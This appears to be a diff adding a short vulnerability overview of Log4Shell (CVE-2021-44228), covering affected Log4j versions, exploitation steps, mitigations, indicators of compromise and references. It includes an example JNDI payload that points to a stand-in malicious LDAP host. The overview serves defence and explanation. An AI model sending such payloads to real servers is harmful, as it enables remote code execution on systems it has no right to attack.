@@ -1,0 +1,38 @@
+Log4Shell (CVE-2021-44228) Vulnerability Overview
+
+Summary:
+Log4Shell is a critical vulnerability (CVE-2021-44228) in the Apache Log4j 2 library, discovered in December 2021. It allows Remote Code Execution (RCE) via JNDI lookups when user-controlled input is logged.
+
+Severity:
+CVSS Score: 10.0 (Critical)
+
+Attack Vector:
+The vulnerability arises when a malicious payload is passed to a logging function, such as:
+${jndi:ldap://malicious.com/a}
+This payload triggers a lookup and executes remote code on the vulnerable server.
+
+Impacted Systems:
+- Java-based applications using Log4j versions 2.0 to 2.14.1
+- Popular affected platforms: Minecraft servers, Apache Struts, ElasticSearch, Spring Boot
+
+Exploitation:
+1. Send payload in HTTP headers or user inputs.
+2. Log4j performs JNDI lookup and fetches remote class file.
+3. Remote code executes on server.
+
+Mitigation:
+- Upgrade to Log4j 2.16.0 or higher
+- Disable JNDI lookups (`log4j2.formatMsgNoLookups=true`)
+- Apply WAF rules to detect exploit strings
+
+Indicators of Compromise:
+- Outbound LDAP or RMI traffic from app servers
+- Unexpected class downloads or classloader activity
+
+Real-World Incidents:
+- Cloudflare, Amazon, and Apple patched systems urgently
+- Active exploitation within hours of disclosure
+
+References:
+- https://logging.apache.org/log4j/2.x/security.html
+- https://nvd.nist.gov/vuln/detail/CVE-2021-44228
